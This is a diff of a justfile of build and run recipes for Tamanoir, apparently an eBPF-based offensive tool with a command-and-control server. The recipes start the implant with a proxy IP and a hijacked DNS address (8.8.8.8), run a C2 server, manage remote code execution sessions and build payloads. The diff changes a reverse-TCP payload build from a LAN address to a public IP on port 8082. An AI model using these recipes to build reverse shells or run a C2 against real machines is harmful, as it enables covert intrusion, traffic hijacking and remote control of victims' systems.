@@ -4,7 +4,7 @@ _default:
 
 
 _build-ebpf:
-    cd tamanoir-ebpf && cargo build --release
+    cd tamanoir-ebpf && cargo build  --release
 
 
 # Build Tamanoir
@@ -26,7 +26,7 @@ tamanoir-run proxy_ip="192.168.1.15" hijack_ip="8.8.8.8" layout="1" log_level="i
     RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}
 
 # Run tui
-tui-run proxy_ip="192.168.1.15" grpc_port="50051" log_level="info":
+tui-run proxy_ip="192.168.1.15" grpc_port="50051" log_level="debug":
     RUST_LOG={{log_level}} target/release/tamanoir-tui -i {{proxy_ip}} -p {{grpc_port}}
     
 # Run c2 server
@@ -55,7 +55,7 @@ c2_delete_rce c2ip="192.168.1.15" session_ip="192.168.1.180":
 
 # Rce build (run on c2 server)
 rce_build_reverse_tcp :
-    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=192.168.1.15 PORT=8082"
+    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-tcp  -b "IP=82.66.170.54 PORT=8082"
 
 rce_build_hello :
     ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello
